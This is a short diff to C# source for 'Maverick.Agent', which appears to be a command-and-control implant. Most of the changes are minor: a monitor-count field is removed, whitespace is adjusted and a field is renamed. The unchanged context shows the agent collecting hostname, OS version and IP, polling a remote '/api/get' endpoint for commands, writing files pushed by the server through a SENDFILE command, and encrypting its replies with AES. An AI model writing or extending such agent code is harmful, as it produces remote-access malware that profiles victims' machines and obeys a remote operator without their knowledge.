@@ -44,7 +44,6 @@ namespace Maverick.Agent
                 Hostname = Environment.MachineName,
                 OSversion = Environment.OSVersion.ToString(),
                 ClientVersion = "1.0.0",
-                NumOfMonitors = System.Windows.Forms.Screen.AllScreens.Length,
                 ClientIP = LocalIP,
             };
             return Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(info));
@@ -85,7 +84,7 @@ namespace Maverick.Agent
                 isRegistry = false;
                 return;
             }
-
+            
             var newCommand = await TrafficFunction.SendDataAsync(BaseURL + "/api/get", BitConverter.GetBytes(InternalID));
             if (newCommand != null && newCommand.Length > 0)
             {
@@ -128,7 +127,7 @@ namespace Maverick.Agent
                         }
                     case "SENDFILE":
                         {
-                            var success = ActionFunction.PerformWriteFile(Command.Command, Command.FileUpload);
+                            var success = ActionFunction.PerformWriteFile(Command.Command, Command.Data);
                             var response = Encoding.UTF8.GetBytes(success ? "Ok" : "");
                             var toSend = GenerateResponseCommand(Command, response, null);
                             var encryptData = await CryptoFunction.EncryptAESPayload(toSend);
